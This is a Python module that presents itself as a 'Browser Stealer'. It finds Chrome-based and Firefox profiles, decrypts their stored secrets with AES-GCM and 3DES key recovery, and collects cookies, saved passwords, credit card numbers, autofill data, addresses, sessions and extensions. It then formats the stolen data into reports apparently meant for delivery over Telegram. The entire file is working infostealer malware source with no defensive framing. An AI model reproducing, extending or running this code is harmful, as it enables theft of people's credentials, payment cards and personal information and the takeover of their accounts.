"""
Browser Stealer — extract cookies, passwords, credit cards, autofill, sessions, extensions.
Supports Chrome-based browsers and Firefox with AES-GCM decryption.
"""
import os
import re
import json
import base64
import shutil
import sqlite3
import tempfile
from pathlib import Path
from datetime import datetime, timezone
from loguru import logger

HAS_SECRETSTORAGE = False
try:
    import secretstorage
    HAS_SECRETSTORAGE = True
except ImportError:
    pass

HAS_PYCRYPTODOME = False
try:
    from Crypto.Cipher import AES as CryptoAES
    from Crypto.Protocol.KDF import PBKDF2
    HAS_PYCRYPTODOME = True
except ImportError:
    pass

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

CHROME_BASED = {
    "chrome":     Path.home() / ".config" / "google-chrome",
    "chromium":   Path.home() / ".config" / "chromium",
    "brave":      Path.home() / ".config" / "BraveSoftware" / "Brave-Browser",
    "edge":       Path.home() / ".config" / "microsoft-edge",
    "vivaldi":    Path.home() / ".config" / "vivaldi",
    "opera":      Path.home() / ".config" / "opera",
    "opera_gx":   Path.home() / ".config" / "opera-gx",
}
FIREFOX_BASE = Path.home() / ".mozilla" / "firefox"


def _copy_db(src: Path) -> str | None:
    if not src.exists():
        return None
    try:
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
        shutil.copy2(str(src), tmp.name)
        return tmp.name
    except Exception as e:
        logger.error(f"DB copy err {src.name}: {e}")
        return None


def _query(copy_path: str, query: str, params: tuple = ()) -> list:
    try:
        conn = sqlite3.connect(copy_path)
        conn.text_factory = bytes
        cur = conn.cursor()
        cur.execute(query, params)
        rows = cur.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"SQLite err: {e}")
        return []
    finally:
        try:
            os.unlink(copy_path)
        except Exception:
            pass


def _enumerate_chrome_profiles() -> list[tuple[str, Path]]:
    profiles = []
    for name, base_dir in CHROME_BASED.items():
        if not base_dir.exists():
            continue
        default = base_dir / "Default"
        if default.exists():
            profiles.append((name, default))
        for p in sorted(base_dir.glob("Profile *")):
            if p.is_dir():
                profiles.append((name, p))
    return profiles


def _enumerate_firefox_profiles() -> list[Path]:
    if not FIREFOX_BASE.exists():
        return []
    return [p for p in sorted(FIREFOX_BASE.glob("*.default*")) if p.is_dir()]


# ── Chrome AES Key Retrieval (v80+) ────────────────────────────────

def _get_chrome_key_secretstorage() -> bytes | None:
    """Get AES-256 key from libsecret via secretstorage."""
    if not HAS_SECRETSTORAGE:
        return None
    try:
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        if collection.is_locked():
            try:
                collection.unlock()
            except Exception:
                pass
        for item in collection.get_all_items():
            label = item.get_label()
            if "Chrome" in label and "Safe Storage" in label:
                return bytes(item.get_secret())
        return None
    except Exception as e:
        logger.debug(f"secretstorage Chrome key: {e}")
        return None


def _get_chrome_key_from_local_state(profile_dir: Path) -> bytes | None:
    """Try to extract AES key from Local State directly."""
    for candidate in [profile_dir.parent / "Local State", profile_dir / "Local State"]:
        if candidate.exists():
            break
    else:
        return None
    try:
        state = json.loads(candidate.read_text())
        enc_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
        if not enc_key_b64:
            return None
        raw = base64.b64decode(enc_key_b64)
        if raw[:3] in (b"v10", b"v11"):
            return raw[3:]
        if raw[:5] == b"DPAPI":
            return None
        return raw
    except Exception as e:
        logger.debug(f"Local State key: {e}")
        return None


def _get_chrome_key(profile_dir: Path) -> bytes | None:
    key = _get_chrome_key_secretstorage()
    if key:
        return key
    return _get_chrome_key_from_local_state(profile_dir)


def _decrypt_chrome_value(encrypted: bytes, key: bytes) -> str | None:
    """Decrypt Chrome v80+ AES-256-GCM value."""
    if not encrypted or not key:
        return None
    try:
        if encrypted[:3] not in (b"v10", b"v11"):
            return encrypted.decode("utf-8", errors="replace")
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        aesgcm = AESGCM(key)
        plain = aesgcm.decrypt(nonce, ciphertext + tag, None)
        return plain.decode("utf-8")
    except Exception as e:
        logger.debug(f"Decrypt Chrome value: {e}")
        return None


# ── Cookie Extraction ──────────────────────────────────────────────

def _steal_cookies_chrome(profile_dir: Path, browser_name: str) -> list[dict]:
    cookies = []
    key = _get_chrome_key(profile_dir)
    for db_name in ["Cookies", "Network/Cookies"]:
        db_path = profile_dir / db_name
        copy = _copy_db(db_path)
        if not copy:
            continue
        rows = _query(copy, """
            SELECT host_key, name, path, encrypted_value, has_expires, expires_utc,
                   is_secure, is_httponly, samesite, last_access_utc, creation_utc
            FROM cookies ORDER BY host_key
        """)
        for row in rows:
            try:
                host, name, path = row[0], row[1], row[2]
                enc_val = row[3]
                value = enc_val.decode("utf-8", errors="replace")
                if key and enc_val[:3] in (b"v10", b"v11"):
                    dec = _decrypt_chrome_value(enc_val, key)
                    if dec:
                        value = dec
                cookies.append({
                    "browser": browser_name,
                    "host": host.decode() if isinstance(host, bytes) else (host or ""),
                    "name": name.decode() if isinstance(name, bytes) else (name or ""),
                    "path": path.decode() if isinstance(path, bytes) else (path or ""),
                    "value": value[:200],
                    "secure": bool(row[6]),
                    "httponly": bool(row[7]),
                })
            except Exception as e:
                logger.debug(f"Cookie parse err: {e}")
    return cookies


def _steal_cookies_firefox(profile_dir: Path) -> list[dict]:
    cookies = []
    copy = _copy_db(profile_dir / "cookies.sqlite")
    if not copy:
        return cookies
    rows = _query(copy, """
        SELECT host, name, path, value, isSecure, isHttpOnly, expiry, lastAccessed
        FROM moz_cookies ORDER BY host
    """)
    for row in rows:
        try:
            host, name, path, val = row[0], row[1], row[2], row[3]
            cookies.append({
                "browser": "firefox",
                "host": host.decode() if isinstance(host, bytes) else (host or ""),
                "name": name.decode() if isinstance(name, bytes) else (name or ""),
                "path": path.decode() if isinstance(path, bytes) else (path or ""),
                "value": (val.decode() if isinstance(val, bytes) else (val or ""))[:200],
                "secure": bool(row[4]),
                "httponly": bool(row[5]),
            })
        except Exception as e:
            logger.debug(f"FF cookie parse: {e}")
    return cookies


# ── Password Extraction ────────────────────────────────────────────

def _steal_passwords_chrome(profile_dir: Path, browser_name: str) -> list[dict]:
    passwords = []
    key = _get_chrome_key(profile_dir)
    db_path = profile_dir / "Login Data"
    copy = _copy_db(db_path)
    if not copy:
        return passwords
    rows = _query(copy, """
        SELECT origin_url, username_value, password_value, signon_realm,
               date_created, date_last_used, times_used, display_name
        FROM logins ORDER BY times_used DESC
    """)
    for row in rows:
        try:
            url = row[0]
            username = row[1]
            enc_pass = row[2]
            password = None
            if key and enc_pass[:3] in (b"v10", b"v11"):
                password = _decrypt_chrome_value(enc_pass, key)
            if not password:
                password = enc_pass.decode("utf-8", errors="replace")
            passwords.append({
                "browser": browser_name,
                "url": url.decode() if isinstance(url, bytes) else (url or ""),
                "username": username.decode() if isinstance(username, bytes) else (username or ""),
                "password": (password or "")[:200],
                "times_used": int(row[6]) if row[6] else 0,
            })
        except Exception as e:
            logger.debug(f"Password parse: {e}")
    return passwords


def _steal_passwords_firefox(profile_dir: Path) -> list[dict]:
    """Decrypt Firefox passwords from logins.json + key4.db."""
    if not HAS_PYCRYPTODOME:
        logger.debug("pycryptodome not available, skipping Firefox password decryption")
        return _steal_passwords_firefox_plaintext(profile_dir)
    return _steal_passwords_firefox_decrypt(profile_dir)


def _steal_passwords_firefox_plaintext(profile_dir: Path) -> list[dict]:
    """Fallback: just read logins.json metadata without password values."""
    logins_file = profile_dir / "logins.json"
    if not logins_file.exists():
        return []
    try:
        data = json.loads(logins_file.read_text())
        results = []
        for entry in data.get("logins", []):
            results.append({
                "browser": "firefox",
                "url": entry.get("hostname", ""),
                "username": "(encrypted — install pycryptodome to decrypt)",
                "password": "(encrypted)",
                "times_used": entry.get("timesUsed", 0),
            })
        return results
    except Exception as e:
        logger.error(f"FF logins.json: {e}")
        return []


def _steal_passwords_firefox_decrypt(profile_dir: Path) -> list[dict]:
    """Decrypt Firefox passwords using key4.db."""
    try:
        from Crypto.Cipher import AES as CryptoAES
        from Crypto.Protocol.KDF import PBKDF2
        import hmac
        import hashlib
    except ImportError:
        return _steal_passwords_firefox_plaintext(profile_dir)

    logins_file = profile_dir / "logins.json"
    key_db = profile_dir / "key4.db"
    if not logins_file.exists() or not key_db.exists():
        return []

    try:
        with open(logins_file) as f:
            logins_data = json.load(f)
    except Exception as e:
        logger.error(f"FF logins.json read: {e}")
        return []

    copy = _copy_db(key_db)
    if not copy:
        return []

    rows = _query(copy, "SELECT item1, item2 FROM metadata WHERE id = 'password'")
    if not rows or len(rows) < 1:
        os.unlink(copy)
        return _steal_passwords_firefox_plaintext(profile_dir)

    global_salt = bytes(rows[0][0])
    master_key_enc = bytes(rows[0][1])

    rows2 = _query(copy, "SELECT a11, a102 FROM nssPrivate")
    if not rows2 or len(rows2) < 1:
        os.unlink(copy)
        return _steal_passwords_firefox_plaintext(profile_dir)
    a11 = bytes(rows2[0][0])
    a102 = bytes(rows2[0][1])

    try:
        os.unlink(copy)
    except Exception:
        pass

    try:
        k1 = hashlib.sha1(global_salt).digest()
        k2 = PBKDF2(k1, b"", dkLen=32, count=1)
        key = k2[:24]
        iv = k2[24:]
        cipher = CryptoAES.new(key, CryptoAES.MODE_CBC, iv=iv)
        dec_key = _unpad(cipher.decrypt(master_key_enc))
    except Exception as e:
        logger.debug(f"FF key decrypt: {e}")
        return _steal_passwords_firefox_plaintext(profile_dir)

    results = []
    for entry in logins_data.get("logins", []):
        try:
            enc_user = base64.b64decode(entry["encryptedUsername"])
            enc_pass = base64.b64decode(entry["encryptedPassword"])
            user = _decrypt_3des(enc_user, dec_key)
            pwd = _decrypt_3des(enc_pass, dec_key)
            results.append({
                "browser": "firefox",
                "url": entry.get("hostname", ""),
                "username": user or "(decrypt failed)",
                "password": pwd or "(decrypt failed)",
                "times_used": entry.get("timesUsed", 0),
            })
        except Exception as e:
            logger.debug(f"FF login decrypt: {e}")
            results.append({
                "browser": "firefox",
                "url": entry.get("hostname", ""),
                "username": "(decrypt failed)",
                "password": "(decrypt failed)",
                "times_used": entry.get("timesUsed", 0),
            })
    return results


def _unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 16:
        return data
    for i in range(pad_len):
        if data[-(i + 1)] != pad_len:
            return data
    return data[:-pad_len]


def _decrypt_3des(enc_data: bytes, key: bytes) -> str | None:
    try:
        from Crypto.Cipher import DES3
        iv = enc_data[:8]
        ciphertext = enc_data[8:]
        cipher = DES3.new(key[:24], DES3.MODE_CBC, iv=iv)
        plain = _unpad(cipher.decrypt(ciphertext))
        return plain.decode("utf-8", errors="replace")
    except Exception as e:
        logger.debug(f"3DES decrypt: {e}")
        return None


# ── Credit Card Extraction ─────────────────────────────────────────

def _steal_credit_cards(profile_dir: Path, browser_name: str) -> list[dict]:
    cards = []
    key = _get_chrome_key(profile_dir)
    copy = _copy_db(profile_dir / "Web Data")
    if not copy:
        return cards
    rows = _query(copy, """
        SELECT guid, name_on_card, expiration_month, expiration_year,
               card_number_encrypted, billing_address_id, nickname
        FROM credit_cards ORDER BY guid
    """)
    for row in rows:
        try:
            enc_num = row[4]
            number = None
            if key and enc_num[:3] in (b"v10", b"v11"):
                number = _decrypt_chrome_value(enc_num, key)
            cards.append({
                "browser": browser_name,
                "name": row[1].decode() if isinstance(row[1], bytes) else (row[1] or ""),
                "month": int(row[2]) if row[2] else 0,
                "year": int(row[3]) if row[3] else 0,
                "number": (number or "(encrypted)")[:50],
                "nickname": row[6].decode() if isinstance(row[6], bytes) else (row[6] or ""),
            })
        except Exception as e:
            logger.debug(f"CC parse: {e}")
    return cards


# ── Autofill Extraction ────────────────────────────────────────────

def _steal_autofill(profile_dir: Path, browser_name: str) -> list[dict]:
    entries = []
    copy = _copy_db(profile_dir / "Web Data")
    if not copy:
        return entries
    rows = _query(copy, """
        SELECT name, value, date_created, date_last_used, count
        FROM autofill ORDER BY count DESC LIMIT 200
    """)
    for row in rows:
        try:
            entries.append({
                "browser": browser_name,
                "field": row[0].decode() if isinstance(row[0], bytes) else (row[0] or ""),
                "value": row[1].decode() if isinstance(row[1], bytes) else (row[1] or "")[:100],
                "count": int(row[4]) if row[4] else 0,
            })
        except Exception as e:
            logger.debug(f"Autofill parse: {e}")
    return entries


# ── Address Extraction (Web Data) ──────────────────────────────────

def _steal_addresses(profile_dir: Path, browser_name: str) -> list[dict]:
    addrs = []
    copy = _copy_db(profile_dir / "Web Data")
    if not copy:
        return addrs
    rows = _query(copy, """
        SELECT country_code, street_address, city, state, zipcode,
               recipient_name, phone_number
        FROM addresses ORDER BY guid
    """)
    for row in rows:
        try:
            addrs.append({
                "browser": browser_name,
                "country": row[0].decode() if isinstance(row[0], bytes) else (row[0] or ""),
                "street": row[1].decode() if isinstance(row[1], bytes) else (row[1] or ""),
                "city": row[2].decode() if isinstance(row[2], bytes) else (row[2] or ""),
                "state": row[3].decode() if isinstance(row[3], bytes) else (row[3] or ""),
                "zip": row[4].decode() if isinstance(row[4], bytes) else (row[4] or ""),
                "name": row[5].decode() if isinstance(row[5], bytes) else (row[5] or ""),
                "phone": row[6].decode() if isinstance(row[6], bytes) else (row[6] or ""),
            })
        except Exception as e:
            logger.debug(f"Address parse: {e}")
    return addrs


# ── Session Extraction ─────────────────────────────────────────────

def _steal_sessions(profile_dir: Path, browser_name: str) -> dict:
    session_dir = profile_dir / "Sessions"
    if not session_dir.is_dir():
        return {"browser": browser_name, "sessions": [], "error": "No Sessions directory"}
    files = []
    for f in sorted(session_dir.iterdir()):
        if f.is_file() and f.stat().st_size > 0:
            files.append({
                "name": f.name,
                "size": f.stat().st_size,
                "modified": datetime.fromtimestamp(f.stat().st_mtime, tz=timezone.utc).isoformat(),
            })
    return {"browser": browser_name, "sessions": files}


# ── Extension Extraction ───────────────────────────────────────────

def _steal_extensions(profile_dir: Path, browser_name: str) -> list[dict]:
    exts = []
    ext_dir = profile_dir / "Extensions"
    if not ext_dir.is_dir():
        return exts
    for ext_id in sorted(ext_dir.iterdir()):
        if not ext_id.is_dir():
            continue
        versions = sorted(ext_id.iterdir())
        if not versions:
            continue
        latest = versions[-1]
        manifest_file = latest / "manifest.json"
        if not manifest_file.exists():
            continue
        try:
            manifest = json.loads(manifest_file.read_text())
            exts.append({
                "browser": browser_name,
                "id": ext_id.name,
                "name": manifest.get("name", "?"),
                "version": manifest.get("version", "?"),
                "description": (manifest.get("description", "") or "")[:100],
                "permissions": manifest.get("permissions", []),
            })
        except Exception as e:
            logger.debug(f"Ext parse {ext_id.name}: {e}")
    return exts


# ── Firefox Key4.db (passwords) helper ─────────────────────────────
# (_steal_passwords_firefox_decrypt already defined above)


# ── Browser Profile Enumeration (Detailed) ─────────────────────────

def _enumerate_profiles_detailed() -> dict:
    result = {}
    for browser_name, base_dir in CHROME_BASED.items():
        if not base_dir.exists():
            continue
        profiles_list = []
        default = base_dir / "Default"
        if default.exists():
            profiles_list.append("Default")
        for p in sorted(base_dir.glob("Profile *")):
            if p.is_dir():
                profiles_list.append(p.name)
        if profiles_list:
            result[browser_name] = {
                "path": str(base_dir),
                "profiles": profiles_list,
            }
    if FIREFOX_BASE.exists():
        ff_profiles = [p.name for p in FIREFOX_BASE.glob("*.default*") if p.is_dir()]
        if ff_profiles:
            result["firefox"] = {
                "path": str(FIREFOX_BASE),
                "profiles": ff_profiles,
            }
    return result


# ── High-Level Public API ──────────────────────────────────────────

def steal_all() -> dict:
    """Collect all browser intelligence from all detected browsers."""
    result = {
        "cookies": [],
        "passwords": [],
        "credit_cards": [],
        "autofill": [],
        "addresses": [],
        "sessions": [],
        "extensions": [],
        "profiles": _enumerate_profiles_detailed(),
    }

    for browser_name, profile_dir in _enumerate_chrome_profiles():
        logger.info(f"Stealing Chrome/{browser_name} @ {profile_dir.name}")
        result["cookies"].extend(_steal_cookies_chrome(profile_dir, browser_name))
        result["passwords"].extend(_steal_passwords_chrome(profile_dir, browser_name))
        result["credit_cards"].extend(_steal_credit_cards(profile_dir, browser_name))
        result["autofill"].extend(_steal_autofill(profile_dir, browser_name))
        result["addresses"].extend(_steal_addresses(profile_dir, browser_name))
        result["sessions"].append(_steal_sessions(profile_dir, browser_name))
        result["extensions"].extend(_steal_extensions(profile_dir, browser_name))

    for profile_dir in _enumerate_firefox_profiles():
        logger.info(f"Stealing Firefox @ {profile_dir.name}")
        result["cookies"].extend(_steal_cookies_firefox(profile_dir))
        result["passwords"].extend(_steal_passwords_firefox(profile_dir))

    return result


def steal_cookies() -> list[dict]:
    cookies = []
    for browser_name, profile_dir in _enumerate_chrome_profiles():
        cookies.extend(_steal_cookies_chrome(profile_dir, browser_name))
    for profile_dir in _enumerate_firefox_profiles():
        cookies.extend(_steal_cookies_firefox(profile_dir))
    return cookies


def steal_passwords() -> list[dict]:
    pws = []
    for browser_name, profile_dir in _enumerate_chrome_profiles():
        pws.extend(_steal_passwords_chrome(profile_dir, browser_name))
    for profile_dir in _enumerate_firefox_profiles():
        pws.extend(_steal_passwords_firefox(profile_dir))
    return pws


# ── Telegram Formatting ────────────────────────────────────────────

def format_steal_report(data: dict, target: str = "all") -> str:
    """Format steal result as Telegram-friendly text."""
    if target == "cookies":
        return _format_cookies(data.get("cookies", []))
    elif target == "passwords":
        return _format_passwords(data.get("passwords", []))
    elif target == "cards":
        return _format_cards(data.get("credit_cards", []))
    elif target == "autofill":
        return _format_autofill(data.get("autofill", []))
    elif target == "addresses":
        return _format_addresses(data.get("addresses", []))
    elif target == "extensions":
        return _format_extensions(data.get("extensions", []))
    elif target == "sessions":
        return _format_sessions(data.get("sessions", []))
    elif target == "profiles":
        return _format_profiles(data.get("profiles", {}))
    else:
        return _format_all(data)


def _format_cookies(cookies: list[dict]) -> str:
    if not cookies:
        return "🍪 Tidak ada cookie ditemukan."
    browsers = {}
    for c in cookies:
        browsers.setdefault(c["browser"], []).append(c)
    lines = [f"🍪 Cookies ({len(cookies)} total):"]
    for bname, bcookies in sorted(browsers.items()):
        lines.append(f"\n  [{bname}] ({len(bcookies)})")
        for c in bcookies[:15]:
            lines.append(f"    {c['host']}  →  {c['name']}={c['value'][:60]}")
        if len(bcookies) > 15:
            lines.append(f"    ... +{len(bcookies) - 15} lainnya")
    return "\n".join(lines)


def _format_passwords(passwords: list[dict]) -> str:
    if not passwords:
        return "🔑 Tidak ada password ditemukan."
    browsers = {}
    for p in passwords:
        browsers.setdefault(p["browser"], []).append(p)
    lines = [f"🔑 Passwords ({len(passwords)} total):"]
    for bname, bpws in sorted(browsers.items()):
        lines.append(f"\n  [{bname}] ({len(bpws)})")
        for p in bpws[:20]:
            lines.append(f"    {p['url'][:50]}")
            lines.append(f"      user: {p['username'][:40]}  pass: {p['password'][:40]}")
        if len(bpws) > 20:
            lines.append(f"    ... +{len(bpws) - 20} lainnya")
    return "\n".join(lines)


def _format_cards(cards: list[dict]) -> str:
    if not cards:
        return "💳 Tidak ada kartu kredit ditemukan."
    lines = [f"💳 Credit Cards ({len(cards)}):"]
    for c in cards:
        lines.append(f"  [{c['browser']}] {c.get('name', '?')}")
        lines.append(f"    Number: {c.get('number', '?')}")
        lines.append(f"    Exp: {c.get('month', '?')}/{c.get('year', '?')}")
    return "\n".join(lines)


def _format_autofill(entries: list[dict]) -> str:
    if not entries:
        return "📝 Tidak ada autofill data."
    lines = [f"📝 Autofill ({len(entries)}):"]
    for e in entries[:30]:
        lines.append(f"  [{e['browser']}] {e['field']} = {e['value'][:60]} ({e['count']}x)")
    if len(entries) > 30:
        lines.append(f"  ... +{len(entries) - 30} lainnya")
    return "\n".join(lines)


def _format_addresses(addrs: list[dict]) -> str:
    if not addrs:
        return "📍 Tidak ada alamat tersimpan."
    lines = [f"📍 Alamat ({len(addrs)}):"]
    for a in addrs:
        parts = [a.get("street", ""), a.get("city", ""), a.get("state", ""), a.get("zip", "")]
        full = ", ".join(p for p in parts if p)
        lines.append(f"  [{a['browser']}] {a.get('name', '?')}")
        lines.append(f"    {full}")
        if a.get("phone"):
            lines.append(f"    Phone: {a['phone']}")
    return "\n".join(lines)


def _format_extensions(exts: list[dict]) -> str:
    if not exts:
        return "🧩 Tidak ada ekstensi terinstall."
    lines = [f"🧩 Ekstensi ({len(exts)}):"]
    for e in exts:
        perm_str = ", ".join(e.get("permissions", [])[:5])
        if len(e.get("permissions", [])) > 5:
            perm_str += "..."
        lines.append(f"  [{e['browser']}] {e['name']} v{e['version']}")
        lines.append(f"    {e.get('description', '')[:80]}")
        if perm_str:
            lines.append(f"    Perm: {perm_str}")
    return "\n".join(lines)


def _format_sessions(sessions: list[dict]) -> str:
    total = sum(len(s.get("sessions", [])) for s in sessions)
    lines = [f"💾 Session Files ({total} dari {len(sessions)} browser):"]
    for s in sessions:
        files = s.get("sessions", [])
        lines.append(f"  [{s['browser']}] ({len(files)} files)")
        for f in files[:5]:
            lines.append(f"    {f['name']} ({f['size']}B)")
        if len(files) > 5:
            lines.append(f"    ... +{len(files) - 5} lainnya")
    return "\n".join(lines)


def _format_profiles(profiles: dict) -> str:
    if not profiles:
        return "🌐 Tidak ada browser profile ditemukan."
    lines = [f"🌐 Browser Profiles ({len(profiles)} browser):"]
    for name, info in sorted(profiles.items()):
        lines.append(f"  [{name}] {info['path']}")
        for p in info.get("profiles", []):
            lines.append(f"    └ {p}")
    return "\n".join(lines)


def _format_all(data: dict) -> str:
    parts = []
    cookies = data.get("cookies", [])
    passwords = data.get("passwords", [])
    cards = data.get("credit_cards", [])
    ext = data.get("extensions", [])

    parts.append(f"🌐 Browser Intelligence Report")
    parts.append(f"   Cookies: {len(cookies)}")
    parts.append(f"   Passwords: {len(passwords)}")
    parts.append(f"   Credit Cards: {len(cards)}")
    parts.append(f"   Autofill: {len(data.get('autofill', []))}")
    parts.append(f"   Addresses: {len(data.get('addresses', []))}")
    parts.append(f"   Extensions: {len(ext)}")
    parts.append(f"   Session files: {sum(len(s.get('sessions',[])) for s in data.get('sessions',[]))}")

    if passwords:
        parts.append(f"\n🔑 Top Passwords:")
        for p in passwords[:5]:
            parts.append(f"  {p['url'][:40]} → {p['username'][:20]}:{p['password'][:30]}")
    if cards:
        parts.append(f"\n💳 Cards:")
        for c in cards[:3]:
            parts.append(f"  {c['name']} {c['number'][:20]} ({c['month']}/{c['year']})")
    if cookies:
        parts.append(f"\n🍪 Sample Cookies:")
        for c in cookies[:5]:
            parts.append(f"  {c['host']} → {c['name']}={c['value'][:40]}")
    if ext:
        parts.append(f"\n🧩 Extensions:")
        for e in ext[:8]:
            parts.append(f"  {e['name']} v{e['version']}")

    return "\n".join(parts)
